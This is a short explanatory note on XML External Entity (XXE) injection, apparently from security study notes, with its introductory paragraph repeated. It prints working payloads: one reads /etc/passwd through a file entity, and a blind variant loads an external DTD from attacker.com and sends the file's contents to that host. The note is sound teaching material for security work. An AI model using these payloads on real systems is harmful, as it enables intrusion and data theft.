## XXE

- When we talk about XML External Entity (XXE) Injection, we're referring to a security vulnerability where an attacker 
can use malicious XML input to access system resources that would normally be unavailable, such as local files or network services. 
This vulnerability can be exploited in applications that use XML to process inputs, such as web applications or web services.
An XXE attack typically involves injecting a malicious XML entity into an HTTP request, 
which is processed by the server and can result in the exposure of sensitive information. For example, an attacker could inject 
an XML entity that references a file on the server's system and obtain confidential information from that file.

- An XXE attack typically involves injecting a malicious XML entity into an HTTP request, which is processed by the server and can result 
in the exposure of sensitive information. For example, an attacker could inject an XML entity that references a file on the server's system 
and obtain confidential information from that file.

- Here are some examples of XXE attacks

### File Disclosure:

```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

This example attempts to read the contents of the /etc/passwd file on a Unix-based system.

### Blind XXE:

```xml
<!DOCTYPE data SYSTEM "http://attacker.com/evil.dtd">
<data>&send;</data>
```

With evil.dtd containing:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
```

This example demonstrates a blind XXE attack where the content of /etc/passwd is sent to the attacker's server